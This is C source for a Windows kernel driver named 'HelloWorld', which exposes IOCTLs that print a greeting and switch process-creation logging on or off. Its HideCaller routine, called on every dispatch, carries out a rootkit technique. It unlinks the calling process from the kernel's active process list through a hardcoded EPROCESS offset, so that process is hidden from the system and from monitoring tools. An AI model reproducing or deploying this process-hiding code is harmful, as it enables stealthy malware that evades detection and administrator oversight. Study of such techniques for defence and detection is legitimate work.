#define FILE_DEVICE_HELLOWORLD 0x00008337
#include <ntddk.h>
#define IOCTL_SAYHELLO (ULONG) CTL_CODE( FILE_DEVICE_HELLOWORLD, 0x00, METHOD_BUFFERED, FILE_ANY_ACCESS )
#define IOCTL_HOOK (ULONG) CTL_CODE( FILE_DEVICE_HELLOWORLD, 0x01, METHOD_BUFFERED, FILE_ANY_ACCESS ) 
#define IOCTL_UNHOOK (ULONG) CTL_CODE( FILE_DEVICE_HELLOWORLD, 0x02, METHOD_BUFFERED, FILE_ANY_ACCESS )

#define NT_DEVICE_NAME      L"\\Device\\HelloWorld"
#define DOS_DEVICE_NAME     L"\\DosDevices\\HelloWorld"

VOID HideCaller(VOID)
{
	ULONG eProcess;
	PLIST_ENTRY plist;
	int FLINKOFFSET=0xb8;

	eProcess = (ULONG)PsGetCurrentProcess();
	plist = (PLIST_ENTRY)(eProcess + FLINKOFFSET);

	*((ULONG*)plist->Blink) = (ULONG)plist->Flink;
	*((ULONG*)plist->Flink + 1) = (ULONG)plist->Blink;

	plist->Flink = (PLIST_ENTRY) &(plist->Flink);
	plist->Blink = (PLIST_ENTRY) &(plist->Flink);
}

VOID DriverProcessNotifyRoutine(
	IN HANDLE ParentId,
	IN HANDLE ProcessId,
	IN BOOLEAN Create)
{
	if (Create)
	{
		DbgPrint("Process %d created process %d\n",
			ParentId, ProcessId);
	}
	else
	{
		DbgPrint("Process %d has ended\n",
			ProcessId);
	}
}

NTSTATUS DriverDispatch(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp)
{
	PIO_STACK_LOCATION iosp;
	ULONG  ioControlCode;
	NTSTATUS status;
	DbgPrint("DriverDispatch called\n");

	HideCaller();

	iosp = IoGetCurrentIrpStackLocation(Irp);
	switch (iosp->MajorFunction) {

	case IRP_MJ_CREATE:
		DbgPrint("DriverDispatch called in create\n");
		status = STATUS_SUCCESS;
		break;
	case IRP_MJ_CLOSE:
		DbgPrint("DriverDispatch called in close\n");
		status = STATUS_SUCCESS;
		break;
	case IRP_MJ_DEVICE_CONTROL:
		DbgPrint("DriverDispatch called in IOCTL\n");
		ioControlCode =
			iosp->Parameters.DeviceIoControl.IoControlCode;
		switch (ioControlCode) {

		case IOCTL_SAYHELLO:
			DbgPrint("Hello World!\n");
			status = STATUS_SUCCESS;
			break;
		case IOCTL_HOOK:
			PsSetCreateProcessNotifyRoutine(
				DriverProcessNotifyRoutine, FALSE);
			break;
		case IOCTL_UNHOOK:
			PsSetCreateProcessNotifyRoutine(
				DriverProcessNotifyRoutine, TRUE);
			break;
		}

		status = STATUS_SUCCESS;
		break;
	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}
	Irp->IoStatus.Status = status;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

DRIVER_UNLOAD DriverUnloadControl;

NTSTATUS DriverEntry(
	PDRIVER_OBJECT DriverObject,
	PUNICODE_STRING RegistryPath)
{
	NTSTATUS status;
	WCHAR deviceNameBuffer[] = L"\\Device\\HelloWorld";
	UNICODE_STRING deviceNameUnicodeString;
	WCHAR deviceLinkBuffer[] = L"\\DosDevices\\HelloWorld";
	UNICODE_STRING deviceLinkUnicodeString;
	PDEVICE_OBJECT interfaceDevice = NULL;

	DbgPrint("DriverEntry called\n");
	RtlInitUnicodeString(&deviceNameUnicodeString,
		deviceNameBuffer);

	status = IoCreateDevice(DriverObject,
		0,
		&deviceNameUnicodeString,
		FILE_DEVICE_HELLOWORLD,
		0,
		TRUE,
		&interfaceDevice);

	if (NT_SUCCESS(status))
	{
		DbgPrint("Sucess\n");
		RtlInitUnicodeString(&deviceLinkUnicodeString,
			deviceLinkBuffer);
		status = IoCreateSymbolicLink(
			&deviceLinkUnicodeString,
			&deviceNameUnicodeString);

		DriverObject->MajorFunction[IRP_MJ_CREATE] =
			DriverObject->MajorFunction[IRP_MJ_CLOSE] =
			DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] =
			DriverDispatch;
		DriverObject->DriverUnload = DriverUnloadControl;
	}
	return status;
}

VOID
DriverUnloadControl(
	_In_ PDRIVER_OBJECT DriverObject
)
/*++

Routine Description:

This routine is called by the I/O system to unload the driver.

Any resources previously allocated must be freed.

Arguments:

DriverObject - a pointer to the object that represents our driver.

Return Value:

None
--*/

{
	PDEVICE_OBJECT deviceObject = DriverObject->DeviceObject;
	UNICODE_STRING uniWin32NameString;

	PAGED_CODE();

	//
	// Create counted string version of our Win32 device name.
	//
	DbgPrint("Driver unloading ++\n");
	RtlInitUnicodeString(&uniWin32NameString, DOS_DEVICE_NAME);


	//
	// Delete the link from our device name to a name in the Win32 namespace.
	//

	IoDeleteSymbolicLink(&uniWin32NameString);

	if (deviceObject != NULL)
	{
		IoDeleteDevice(deviceObject);
	}



}